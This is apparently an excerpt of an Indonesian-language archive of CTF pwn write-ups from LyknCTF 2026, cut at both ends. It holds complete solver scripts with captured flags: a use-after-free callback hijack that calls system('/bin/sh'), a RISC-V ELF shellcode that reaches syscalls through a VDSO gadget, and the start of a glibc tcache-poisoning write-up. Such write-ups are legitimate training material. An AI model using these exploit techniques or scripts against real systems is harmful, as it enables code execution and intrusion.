        "content": "Handler `profile add` menjalankan:\n\n\n\nUkuran request-nya sama dengan block style yang sudah bebas. Dua pemanggilan berturut-turut merebut kembali block A dan B.\n\nAllocation pertama menimpa stale `ComputedStyle`:\n\n\n\nAllocation kedua membuat filter palsu di block B:\n\n\n\nSaat `render`, paint cache membaca block A sebagai style, mengambil pointer filter pada offset `+0x10`, memvalidasi magic block B, lalu memanggil callback yang kita tentukan.",
        "code": "page = calloc(1, 0x430);\ndecode_hex_into(page);"
      },
      {
        "title": "Kenapa Perlu Dua Stage",
        "content": "`run.sh` menjalankan binary dengan loader dan libc bundle:\n\n\n\nMemanggil `system(\"/bin/sh\")` langsung dapat gagal. Shell eksternal mewarisi `LD_LIBRARY_PATH` dan mencoba memuat libc challenge, padahal executable `/bin/sh` berasal dari host.\n\nPrimitive callback menerima satu argumen string, jadi stage pertama dibuat sebagai:\n\n\n\nOffset pada libc bundle:\n\n\n\nSetelah environment bersih, UAF dibuat sekali lagi dengan document `/bin/sh`. Callback tahap kedua:",
        "code": "export LD_LIBRARY_PATH=\"$DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\"\nexec \"$DIR/ld-linux-x86-64.so.2\" --library-path \"$DIR\" \"$DIR/chall\""
      },
      {
        "title": "Offset:",
        "content": "",
        "code": "system = libc_base + 0x58750"
      },
      {
        "title": "Alur Exploit",
        "content": "Stage pertama:\n\n\n\nStage kedua:",
        "code": "load LD_LIBRARY_PATH\nstyle one\nlayout\npaint\nstyle two\noptimize\ninspect paint raw\nprofile add <fake style>\nprofile add <magic + unsetenv>\nrender"
      },
      {
        "title": "Remote:",
        "content": "Lokal dari folder hasil ekstrak:\n\n\n\nValidasi lokal:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\n\r\nfrom pwn import *\r\n\r\nHOST = \"15.235.202.47\"\r\nPORT = 9001\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"debug\" if args.DEBUG else \"info\"\r\n\r\nPROMPT = b\"glyph> \"\r\n\r\n# Offset berdasarkan libc.so.6 dari challenge.\r\nUNSORTED_FD_OFFSET = 0x203B20\r\nSYSTEM_OFFSET = 0x58750\r\nUNSETENV_OFFSET = 0x4ADA0\r\n\r\n# \"GYPHFLIF\" dalam little-endian.\r\nFILTER_MAGIC = 0x46494C4648505947\r\n\r\n\r\ndef find_local_file(names):\r\n    for name in names:\r\n        path = Path(name)\r\n        if path.exists():\r\n            return str(path)\r\n\r\n    raise FileNotFoundError(f\"File lokal tidak ditemukan: {names}\")\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        run_script = find_local_file(\r\n            [\r\n                \"./public/run.sh\",\r\n                \"./run.sh\",\r\n            ]\r\n        )\r\n\r\n        return process([\"/bin/sh\", run_script])\r\n\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef command(io, data):\r\n    if isinstance(data, str):\r\n        data = data.encode()\r\n\r\n    io.sendline(data)\r\n    return io.recvuntil(PROMPT, drop=True)\r\n\r\n\r\ndef parse_uaf_leak(output):\r\n    match = re.search(rb\"raw=([0-9a-fA-F]+)\", output)\r\n    if not match:\r\n        log.failure(f\"Raw leak tidak ditemukan:\\n{output!r}\")\r\n        raise RuntimeError(\"failed to parse inspect output\")\r\n\r\n    raw = bytes.fromhex(match.group(1).decode())\r\n\r\n    if len(raw) < 16:\r\n        raise RuntimeError(\"inspect leak terlalu pendek\")\r\n\r\n    unsorted_fd = u64(raw[0:8])\r\n    next_chunk_header = u64(raw[8:16])\r\n\r\n    libc_base = unsorted_fd - UNSORTED_FD_OFFSET\r\n\r\n    if libc_base & 0xFFF:\r\n        log.warning(\r\n            f\"libc base tidak page-aligned: {libc_base:#x}\"\r\n        )\r\n\r\n    # bk pada chunk stale menunjuk header chunk 0x430 kedua.\r\n    fake_filter = next_chunk_header + 0x10\r\n\r\n    log.info(f\"unsorted fd       = {unsorted_fd:#x}\")\r\n    log.info(f\"next chunk header = {next_chunk_header:#x}\")\r\n    log.success(f\"libc base         = {libc_base:#x}\")\r\n    log.success(f\"fake filter       = {fake_filter:#x}\")\r\n\r\n    return libc_base, fake_filter\r\n\r\n\r\ndef create_stale_paint(\r\n    io,\r\n    document,\r\n    replacement_style,\r\n    initial_style=None,\r\n):\r\n    command(io, b\"load \" + document)\r\n\r\n    if initial_style is not None:\r\n        command(io, b\"style \" + initial_style)\r\n\r\n    command(io, b\"layout\")\r\n    command(io, b\"paint\")\r\n\r\n    # Style lama menjadi retired, tetapi paint cache tetap menunjuk\r\n    # ComputedStyle lama karena layout hash tidak berubah.\r\n    command(io, b\"style \" + replacement_style)\r\n\r\n    # Membebaskan arena retired tanpa membuang paint cache.\r\n    output = command(io, b\"optimize\")\r\n\r\n    if b\"paint cache kept\" not in output:\r\n        log.failure(output.decode(errors=\"replace\"))\r\n        raise RuntimeError(\"paint cache tidak dipertahankan\")\r\n\r\n    output = command(io, b\"inspect paint raw\")\r\n    return parse_uaf_leak(output)\r\n\r\n\r\ndef install_callback(io, fake_filter, callback):\r\n    # Allocation profile pertama mengambil kembali chunk ComputedStyle\r\n    # yang masih ditunjuk paint cache.\r\n    stale_style = bytearray(0x18)\r\n    stale_style[0x10:0x18] = p64(fake_filter)\r\n\r\n    output = command(\r\n        io,\r\n        b\"profile add \" + stale_style.hex().encode(),\r\n    )\r\n\r\n    if b\"stored page=\" not in output:\r\n        raise RuntimeError(\"gagal menyimpan stale style page\")\r\n\r\n    # Allocation kedua mengambil chunk arena berikutnya.\r\n    # Layout:\r\n    #   +0x00 = magic\r\n    #   +0x08 = function pointer\r\n    filter_object = flat(\r\n        FILTER_MAGIC,\r\n        callback,\r\n    )\r\n\r\n    output = command(\r\n        io,\r\n        b\"profile add \" + filter_object.hex().encode(),\r\n    )\r\n\r\n    if b\"stored page=\" not in output:\r\n        raise RuntimeError(\"gagal menyimpan fake filter page\")\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    io.recvuntil(PROMPT)\r\n\r\n    # ------------------------------------------------------------\r\n    # Stage 1: unsetenv(\"LD_LIBRARY_PATH\")\r\n    #\r\n    # system(\"/bin/sh\") langsung bisa gagal karena shell eksternal\r\n    # mencoba memakai libc bundle challenge. Bersihkan env tersebut\r\n    # lebih dulu memakai primitive callback satu argumen.\r\n    # ------------------------------------------------------------\r\n    libc_base, fake_filter = create_stale_paint(\r\n        io,\r\n        document=b\"LD_LIBRARY_PATH\",\r\n        initial_style=b\"one\",\r\n        replacement_style=b\"two\",\r\n    )\r\n\r\n    unsetenv = libc_base + UNSETENV_OFFSET\r\n\r\n    log.info(f\"unsetenv = {unsetenv:#x}\")\r\n\r\n    install_callback(\r\n        io,\r\n        fake_filter=fake_filter,\r\n        callback=unsetenv,\r\n    )\r\n\r\n    output = command(io, b\"render\")\r\n\r\n    if b\"filter missing\" in output:\r\n        raise RuntimeError(\"fake filter stage 1 gagal\")\r\n\r\n    log.success(\"LD_LIBRARY_PATH berhasil dibersihkan\")\r\n\r\n    # ------------------------------------------------------------\r\n    # Stage 2: system(\"/bin/sh\")\r\n    #\r\n    # Style 'two' masih aktif. Buat paint cache baru yang menunjuk\r\n    # style tersebut, retire lewat style 'three', lalu reclaim lagi.\r\n    # ------------------------------------------------------------\r\n    libc_base_2, fake_filter_2 = create_stale_paint(\r\n        io,\r\n        document=b\"/bin/sh\",\r\n        initial_style=None,\r\n        replacement_style=b\"three\",\r\n    )\r\n\r\n    if libc_base_2 != libc_base:\r\n        log.warning(\r\n            f\"libc base berubah: {libc_base:#x} -> \"\r\n            f\"{libc_base_2:#x}\"\r\n        )\r\n\r\n    system = libc_base_2 + SYSTEM_OFFSET\r\n\r\n    log.info(f\"system = {system:#x}\")\r\n\r\n    install_callback(\r\n        io,\r\n        fake_filter=fake_filter_2,\r\n        callback=system,\r\n    )\r\n\r\n    # render memanggil callback dengan document string sebagai RDI:\r\n    # system(\"/bin/sh\")\r\n    io.sendline(b\"render\")\r\n\r\n    log.success(\"Shell seharusnya sudah aktif\")\r\n\r\n    # Coba ambil flag otomatis, lalu tetap masuk interactive.\r\n    io.sendline(\r\n        b'for f in /flag /flag.txt ./flag ./flag.txt; '\r\n        b'do [ -f \"$f\" ] && cat \"$f\"; done; '\r\n        b'[ -x /readflag ] && /readflag'\r\n    )\r\n\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-golfing",
    "title": "Golfing",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Pwn\n**CTF:** LYKNCTF 2026\n**Architecture:** RISC-V 64-bit\n**Flag:** `LYKNCTF{\"The moon is beautiful, isn't it?\"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}`",
    "problemDescription": "```text\nBuat ELF RISC-V minimal\n        ↓\nCari AT_SYSINFO_EHDR dari auxiliary vector\n        ↓\nDapatkan base address VDSO\n        ↓\nGunakan gadget ecall; ret di dalam VDSO\n        ↓\nopenat(\"/flag.txt\")\n        ↓\nread(fd, buffer, 0x100)\n        ↓\nwrite(1, buffer, bytes_read)\n        ↓\nFlag\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "File challenge berisi kernel Linux RISC-V, initramfs, dan script untuk menjalankan guest melalui QEMU.\n\nService remote meneruskan koneksi ke program yang berjalan di guest. Program tersebut menerima ELF RISC-V Base64, melakukan beberapa validasi, lalu mengeksekusinya.\n\nBeberapa batasan penting:\n\n\n\nOpcode yang ditolak:\n\n\n\nSyscall Linux RISC-V normalnya membutuhkan instruksi `ecall`. Karena byte instruksinya diperiksa sebelum ELF dijalankan, syscall tidak bisa ditempatkan langsung di shellcode.",
        "code": "Ukuran ELF harus kecil\nUkuran section .text maksimal 0x71 byte\nInstruksi ecall dilarang\nInstruksi ebreak dilarang\nCompressed ebreak juga dilarang"
      },
      {
        "title": "Bypass Filter Syscall",
        "content": "Walaupun shellcode tidak boleh mengandung `ecall`, proses tetap memiliki VDSO yang dipetakan oleh kernel.\n\nVDSO berisi kode executable milik kernel. Salah satu gadget yang tersedia adalah:\n\n\n\nGadget berada pada offset:\n\n\n\nPayload hanya perlu mencari base address VDSO, lalu memanggil gadget tersebut setiap kali ingin menjalankan syscall.\n\nByte `ecall` tidak berada di ELF buatan kita, sehingga pemeriksaan opcode tetap lolos.",
        "code": "ecall\nret"
      },
      {
        "title": "Mencari VDSO dari Auxiliary Vector",
        "content": "Saat ELF mulai dieksekusi, stack berisi struktur startup Linux:\n\n\n\nAuxiliary vector terdiri dari pasangan:\n\n\n\nEntry yang dibutuhkan adalah:\n\n\n\nNilainya merupakan alamat base ELF VDSO.\n\nShellcode berjalan dari `sp`, melewati:\n\n1. `argc`",
        "code": "argc\nargv[]\nNULL\nenvp[]\nNULL\nauxv[]"
      },
      {
        "title": "6. Pasangan auxiliary vector",
        "content": "Saat type `33` ditemukan:\n\n\n\nGadget tersebut dipanggil menggunakan `jalr`, sehingga register `ra` terisi alamat kembali. Instruksi `ret` setelah `ecall` akan kembali ke shellcode.",
        "code": "vdso_base = auxv.value\nsyscall_gadget = vdso_base + 0xc50"
      },
      {
        "title": "Syscall Chain",
        "content": "Payload membaca `/flag.txt` menggunakan tiga syscall."
      },
      {
        "title": "openat",
        "content": "Syscall number RISC-V:",
        "code": "openat = 56"
      },
      {
        "title": "Register:",
        "content": "",
        "code": "a0 = -100                # AT_FDCWD\na1 = address \"/flag.txt\"\na2 = 0                   # O_RDONLY\na3 = 0\na7 = 56"
      },
      {
        "title": "Pemanggilan:",
        "content": "Return value pada `a0` adalah file descriptor.",
        "code": "jalr ra, syscall_gadget"
      },
      {
        "title": "read",
        "content": "Syscall number:",
        "code": "read = 63"
      },
      {
        "title": "Register:",
        "content": "Ukuran baca awalnya sempat dibuat `0x40`, sehingga output berhenti setelah 64 byte:\n\n\n\nFlag ternyata lebih panjang dari 64 byte. Immediate pada instruksi `li a2, 0x40` kemudian diubah menjadi `0x100`.\n\nPatch byte:",
        "code": "a0 = fd\na1 = writable buffer\na2 = 0x100\na7 = 63"
      },
      {
        "title": "write",
        "content": "Syscall number:",
        "code": "write = 64"
      },
      {
        "title": "Register:",
        "content": "Output dikirim langsung melalui koneksi remote.",
        "code": "a0 = 1                   # stdout\na1 = buffer\na2 = jumlah byte hasil read\na7 = 64"
      },
      {
        "title": "ELF Minimal",
        "content": "Payload dibungkus sebagai ELF64 little-endian untuk RISC-V.\n\nHeader utama:\n\n\n\nDua program header digunakan.",
        "code": "Class       : ELF64\nEndianness  : Little endian\nMachine     : EM_RISCV\nType        : ET_EXEC\nEntry point : 0x100b0"
      },
      {
        "title": "Segment RX",
        "content": "",
        "code": "Virtual address : 0x10000\nPermission      : Read + Execute\nContent         : ELF header, program header, shellcode"
      },
      {
        "title": "Segment RW",
        "content": "Segment kedua menyediakan buffer writable tanpa perlu menyimpan data tambahan di file ELF.\n\nHasil akhir:\n\n\n\nUkuran tersebut masih berada di bawah batas validator.",
        "code": "Virtual address : 0x210000\nPermission      : Read + Write\nFile size       : 0\nMemory size     : 0x1000"
      },
      {
        "title": "Shellcode",
        "content": "Shellcode final disimpan sebagai raw machine code:\n\n\n\nBagian terakhir adalah string:",
        "code": "TEXT = bytes.fromhex(\n    \"0a879307100214632107e39ef6fe0063\"\n    \"85673e94130404c51305c0f997050000\"\n    \"938525030146930880030294aa842685\"\n    \"8a85130600109308f00302942a860545\"\n    \"93080004029401459308d00502942f66\"\n    \"6c61672e74787400\"\n)"
      },
      {
        "title": "Solver",
        "content": "",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport base64\nimport re\nimport socket\nimport struct\nimport sys\n\n\nTEXT = bytes.fromhex(\n    \"0a879307100214632107e39ef6fe0063\"\n    \"85673e94130404c51305c0f997050000\"\n    \"938525030146930880030294aa842685\"\n    \"8a85130600109308f00302942a860545\"\n    \"93080004029401459308d00502942f66\"\n    \"6c61672e74787400\"\n)\n\n\ndef build_elf():\n    ehsize = 0x40\n    phentsize = 0x38\n    phnum = 2\n\n    text_offset = ehsize + phentsize * phnum\n    text_address = 0x10000 + text_offset\n\n    shentsize = 0x40\n    shnum = 3\n    shoff = text_offset + len(TEXT)\n\n    total_size = shoff + shentsize * shnum\n    shstr = b\"\\x00.text\\x00.shstrtab\\x00\"\n\n    elf = bytearray(total_size)\n\n    ident = bytearray(16)\n    ident[:4] = b\"\\x7fELF\"\n    ident[4] = 2\n    ident[5] = 1\n    ident[6] = 1\n\n    elf[:16] = ident\n\n    struct.pack_into(\n        \"<HHIQQQIHHHHHH\",\n        elf,\n        0x10,\n        2,\n        0xF3,\n        1,\n        text_address,\n        ehsize,\n        shoff,\n        0,\n        ehsize,\n        phentsize,\n        phnum,\n        shentsize,\n        shnum,\n        2,\n    )\n\n    struct.pack_into(\n        \"<IIQQQQQQ\",\n        elf,\n        0x40,\n        1,\n        5,\n        0,\n        0x10000,\n        0x10000,\n        total_size,\n        0x1000,\n        0x1000,\n    )\n\n    struct.pack_into(\n        \"<IIQQQQQQ\",\n        elf,\n        0x78,\n        1,\n        6,\n        0,\n        0x210000,\n        0x210000,\n        0,\n        0x1000,\n        0x1000,\n    )\n\n    elf[text_offset:text_offset + len(TEXT)] = TEXT\n\n    shstr_offset = shoff + 0x2F\n    elf[shstr_offset:shstr_offset + len(shstr)] = shstr\n\n    struct.pack_into(\n        \"<IIQQQQIIQQ\",\n        elf,\n        shoff + shentsize,\n        1,\n        1,\n        6,\n        text_address,\n        text_offset,\n        len(TEXT),\n        0,\n        0,\n        2,\n        0,\n    )\n\n    struct.pack_into(\n        \"<IIQQQQIIQQ\",\n        elf,\n        shoff + shentsize * 2,\n        7,\n        3,\n        0,\n        0,\n        shstr_offset,\n        len(shstr),\n        0,\n        0,\n        1,\n        0,\n    )\n\n    return bytes(elf)\n\n\ndef recv_until(sock, marker):\n    data = bytearray()\n\n    while marker not in data:\n        chunk = sock.recv(4096)\n\n        if not chunk:\n            break\n\n        data.extend(chunk)\n\n    return bytes(data)\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"host\", nargs=\"?\", default=\"15.235.202.47\")\n    parser.add_argument(\"port\", nargs=\"?\", type=int, default=9002)\n    args = parser.parse_args()\n\n    payload = base64.b64encode(build_elf())\n\n    with socket.create_connection(\n        (args.host, args.port),\n        timeout=10,\n    ) as sock:\n        banner = recv_until(sock, b\"base64): \")\n\n        sys.stdout.write(\n            banner.decode(errors=\"replace\")\n        )\n        sys.stdout.flush()\n\n        sock.sendall(payload + b\"\\n\")\n\n        output = bytearray()\n        sock.settimeout(5)\n\n        while True:\n            try:\n                chunk = sock.recv(4096)\n            except socket.timeout:\n                break\n\n            if not chunk:\n                break\n\n            output.extend(chunk)\n\n    text = output.decode(errors=\"replace\")\n    print(text)\n\n    match = re.search(\n        r\"LYKNCTF\\{.*?\\}\",\n        text,\n        re.DOTALL,\n    )\n\n    if match:\n        print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "title": "Jalankan:",
        "content": "",
        "code": "python3 solve.py 15.235.202.47 9002"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "Send your RISC-V ELF (base64):\nLYKNCTF{\"The moon is beautiful, isn't it?\"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport base64\r\nimport re\r\nimport socket\r\nimport struct\r\nimport sys\r\nimport time\r\n\r\n# RISC-V shellcode assembled for VA 0x100b0.\r\n# It finds AT_SYSINFO_EHDR, uses the kernel-provided VDSO gadget at +0xc50\r\n# (ecall; ret), then performs openat/read/write on /flag.txt.\r\nTEXT = bytes.fromhex(\r\n    \"0a879307100214632107e39ef6fe0063\"\r\n    \"85673e94130404c51305c0f997050000\"\r\n    \"938525030146930880030294aa842685\"\r\n    \"8a85130600109308f00302942a860545\"\r\n    \"93080004029401459308d00502942f66\"\r\n    \"6c61672e74787400\"\r\n)\r\n\r\n\r\ndef build_elf() -> bytes:\r\n    ehsize = 0x40\r\n    phentsize = 0x38\r\n    phnum = 2\r\n    text_off = ehsize + phentsize * phnum\r\n    text_addr = 0x10000 + text_off\r\n    shentsize = 0x40\r\n    shnum = 3\r\n    shoff = text_off + len(TEXT)\r\n    total = shoff + shentsize * shnum\r\n    shstr = b\"\\x00.text\\x00.shstrtab\\x00\"\r\n\r\n    elf = bytearray(total)\r\n\r\n    ident = bytearray(16)\r\n    ident[:4] = b\"\\x7fELF\"\r\n    ident[4] = 2\r\n    ident[5] = 1\r\n    ident[6] = 1\r\n    elf[:16] = ident\r\n\r\n    struct.pack_into(\r\n        \"<HHIQQQIHHHHHH\",\r\n        elf,\r\n        0x10,\r\n        2,\r\n        0xF3,\r\n        1,\r\n        text_addr,\r\n        ehsize,\r\n        shoff,\r\n        0,\r\n        ehsize,\r\n        phentsize,\r\n        phnum,\r\n        shentsize,\r\n        shnum,\r\n        2,\r\n    )\r\n\r\n    struct.pack_into(\r\n        \"<IIQQQQQQ\",\r\n        elf,\r\n        0x40,\r\n        1,\r\n        5,\r\n        0,\r\n        0x10000,\r\n        0x10000,\r\n        total,\r\n        0x1000,\r\n        0x1000,\r\n    )\r\n\r\n    struct.pack_into(\r\n        \"<IIQQQQQQ\",\r\n        elf,\r\n        0x78,\r\n        1,\r\n        6,\r\n        0,\r\n        0x210000,\r\n        0x210000,\r\n        0,\r\n        0x1000,\r\n        0x1000,\r\n    )\r\n\r\n    elf[text_off:text_off + len(TEXT)] = TEXT\r\n\r\n    shstr_off = shoff + 0x2F\r\n    elf[shstr_off:shstr_off + len(shstr)] = shstr\r\n\r\n    struct.pack_into(\r\n        \"<IIQQQQIIQQ\",\r\n        elf,\r\n        shoff + shentsize,\r\n        1,\r\n        1,\r\n        6,\r\n        text_addr,\r\n        text_off,\r\n        len(TEXT),\r\n        0,\r\n        0,\r\n        2,\r\n        0,\r\n    )\r\n\r\n    struct.pack_into(\r\n        \"<IIQQQQIIQQ\",\r\n        elf,\r\n        shoff + shentsize * 2,\r\n        7,\r\n        3,\r\n        0,\r\n        0,\r\n        shstr_off,\r\n        len(shstr),\r\n        0,\r\n        0,\r\n        1,\r\n        0,\r\n    )\r\n\r\n    if not (0xB0 <= len(elf) <= 0x1E1):\r\n        raise RuntimeError(f\"invalid ELF size: {len(elf)}\")\r\n\r\n    if len(TEXT) > 0x71:\r\n        raise RuntimeError(f\"text too large: {len(TEXT)}\")\r\n\r\n    for bad in (\r\n        b\"\\x73\\x00\\x00\\x00\",\r\n        b\"\\x73\\x00\\x10\\x00\",\r\n        b\"\\x02\\x90\",\r\n    ):\r\n        if bad in elf:\r\n            raise RuntimeError(f\"forbidden opcode bytes: {bad.hex()}\")\r\n\r\n    for index in range(len(TEXT) - 3):\r\n        if len(set(TEXT[index:index + 4])) == 1:\r\n            raise RuntimeError(\r\n                f\"four repeated text bytes at {index:#x}\"\r\n            )\r\n\r\n    return bytes(elf)\r\n\r\n\r\ndef recv_until(\r\n    sock: socket.socket,\r\n    marker: bytes,\r\n    timeout: float,\r\n) -> bytes:\r\n    sock.settimeout(timeout)\r\n    data = bytearray()\r\n\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n\r\n        if not chunk:\r\n            break\r\n\r\n        data.extend(chunk)\r\n\r\n    return bytes(data)\r\n\r\n\r\ndef recv_remaining(\r\n    sock: socket.socket,\r\n    idle_timeout: float = 3.0,\r\n) -> bytes:\r\n    sock.settimeout(idle_timeout)\r\n    data = bytearray()\r\n\r\n    while True:\r\n        try:\r\n            chunk = sock.recv(4096)\r\n        except socket.timeout:\r\n            break\r\n\r\n        if not chunk:\r\n            break\r\n\r\n        data.extend(chunk)\r\n\r\n    return bytes(data)\r\n\r\n\r\ndef exploit(\r\n    host: str,\r\n    port: int,\r\n    timeout: float,\r\n) -> str:\r\n    elf = build_elf()\r\n    encoded = base64.b64encode(elf)\r\n\r\n    print(f\"[+] text size : {len(TEXT)} bytes\")\r\n    print(f\"[+] ELF size  : {len(elf)} bytes\")\r\n    print(f\"[+] Base64    : {len(encoded)} bytes\")\r\n\r\n    last_error: Exception | None = None\r\n\r\n    for attempt in range(1, 6):\r\n        try:\r\n            print(\r\n                f\"[*] connecting to {host}:{port} \"\r\n                f\"(attempt {attempt}/5)\"\r\n            )\r\n\r\n            with socket.create_connection(\r\n                (host, port),\r\n                timeout=timeout,\r\n            ) as sock:\r\n                banner = recv_until(\r\n                    sock,\r\n                    b\"base64): \",\r\n                    timeout,\r\n                )\r\n\r\n                sys.stdout.write(\r\n                    banner.decode(\r\n                        \"utf-8\",\r\n                        errors=\"replace\",\r\n                    )\r\n                )\r\n                sys.stdout.flush()\r\n\r\n                sock.sendall(encoded + b\"\\n\")\r\n\r\n                output = recv_remaining(\r\n                    sock,\r\n                    idle_timeout=5.0,\r\n                )\r\n\r\n                text = output.decode(\r\n                    \"utf-8\",\r\n                    errors=\"replace\",\r\n                )\r\n\r\n                print(\r\n                    text,\r\n                    end=\"\" if text.endswith(\"\\n\") else \"\\n\",\r\n                )\r\n\r\n                return text\r\n\r\n        except (OSError, socket.timeout) as exc:\r\n            last_error = exc\r\n\r\n            if attempt != 5:\r\n                time.sleep(1.0)\r\n\r\n    raise RuntimeError(\r\n        f\"connection failed: {last_error}\"\r\n    )\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"LYKNCTF golfing solver\"\r\n    )\r\n\r\n    parser.add_argument(\r\n        \"host\",\r\n        nargs=\"?\",\r\n        default=\"15.235.202.47\",\r\n    )\r\n\r\n    parser.add_argument(\r\n        \"port\",\r\n        nargs=\"?\",\r\n        type=int,\r\n        default=9002,\r\n    )\r\n\r\n    parser.add_argument(\r\n        \"--timeout\",\r\n        type=float,\r\n        default=10.0,\r\n    )\r\n\r\n    args = parser.parse_args()\r\n\r\n    try:\r\n        output = exploit(\r\n            args.host,\r\n            args.port,\r\n            args.timeout,\r\n        )\r\n    except Exception as exc:\r\n        print(f\"[-] {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = re.search(\r\n        r\"(?:LYKN(?:CTF)?|[A-Za-z0-9_]+)\"\r\n        r\"\\{[^}\\r\\n]+\\}\",\r\n        output,\r\n    )\r\n\r\n    if match:\r\n        print(f\"<FLAG>{match.group(0)}</FLAG>\")\r\n        return 0\r\n\r\n    print(\r\n        \"[-] payload sent, but no flag pattern was found\",\r\n        file=sys.stderr,\r\n    )\r\n\r\n    return 2\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nLYKNCTF{\"The moon is beautiful, isn't it?\"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-h34pd3v1l",
    "title": "H34P D3V1L — Pwn",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKN CTF 2026  \n**Category:** Pwn  \n**Architecture:** amd64  \n**Libc:** glibc 2.39  \n**Flag:** `LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}`",
    "problemDescription": "**CTF:** LYKN CTF 2026  \n**Category:** Pwn  \n**Architecture:** amd64  \n**Libc:** glibc 2.39  \n**Flag:** `LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "> Even demons make mistakes. The Heap Devil has invited you to play a dangerous game with his \"unbreakable\" contracts. Outwit the master of trickery, beat him at his own game, and escape with the flag!"
      },
      {
        "title": "Service:",
        "content": "",
        "code": "nc 15.235.202.47 9009"
      },
      {
        "title": "Protections",
        "content": "GOT overwrite tidak menarik karena Full RELRO. NX dan PIE juga membuat eksekusi shellcode langsung tidak praktis. Jalur akhirnya adalah heap leak, arbitrary allocation, stack leak, lalu ROP ke libc.\n\nBinary membawa `libc.so.6` glibc 2.39. Safe-linking aktif pada tcache, jadi poisoning perlu mengetahui alamat heap chunk yang menyimpan `next` pointer.",
        "code": "checksec --file=Heap_devil"
      },
      {
        "title": "Struktur note",
        "content": "Dari akses ke array global `notes`, setiap entry berukuran `0x18` byte:\n\n\n\nProgram menyediakan operasi create, view, edit, delete, dan change size. `change_note_size()` tidak memakai `realloc()`. Fungsi ini melakukan `free(old_data)`, `malloc(new_size)`, kemudian mengganti pointer pada note.",
        "code": "typedef struct {\n    int in_use;      // +0x00\n    int size;        // +0x04\n    int id;          // +0x08\n    int padding;     // +0x0c\n    char *data;      // +0x10\n} Note;"
      },
      {
        "title": "Bug: stale duplicate entry dan off-by-one index",
        "content": "Validasi indeks pada `view_note()` dan `edit_note()` menerima `index == num_notes`:\n\n\n\nKondisi yang benar seharusnya `index >= num_notes`.\n\n`delete_note()` menggeser entry setelah note yang dihapus, lalu mengurangi `num_notes`:\n\n\n\nSlot lama di `notes[num_notes]` tidak dibersihkan. Akibatnya, entry terakhir tersalin dua kali saat array digeser. Satu salinan tetap berada di luar batas logis array dan masih dapat diakses melalui bug `index == num_notes` pada view/edit.\n\nKombinasi ini menghasilkan stale alias:\n\n\n\n`view(k)` menjadi UAF read dan `edit(k)` menjadi UAF write.",
        "code": "if (index < 0 || index > num_notes) {\n    puts(\"Invalid index!\");\n    return;\n}"
      },
      {
        "title": "Membuat primitive tcache poisoning",
        "content": "Solver membuat dua chunk berukuran sama, `X` dan `Y`, yang dialokasikan berurutan.\n\n\n\nChunk `X` kemudian di-resize ke ukuran lain. Implementasi resize membebaskan chunk lama milik `X`, sehingga chunk itu masuk ke tcache bin ukuran awal.\n\n\n\nDua kali delete membentuk stale entry yang menunjuk ke `Y` setelah `Y` masuk ke tcache. Tcache bin sekarang berbentuk:\n\n\n\nMembaca data stale `Y` membocorkan safe-linked `fd`:\n\n\n\nKarena `X` dan `Y` berurutan, hubungan berikut diketahui:\n\n\n\nSolver membalik kandidat safe-linking lalu mencoba beberapa page key di sekitar kandidat sampai memenuhi:\n\n\n\nSetelah alamat `Y` diketahui, `fd` dapat diganti dengan target arbitrary allocation:\n\n\n\nDua alokasi berikutnya menghasilkan:\n\n\n\nPrimitive ini dibungkus oleh fungsi `poison_allocate()` pada `solve.py`.",
        "code": "create(request_size, b\"X\")\ncreate(request_size, b\"Y\")"
      },
      {
        "title": "Leak libc dari unsorted bin",
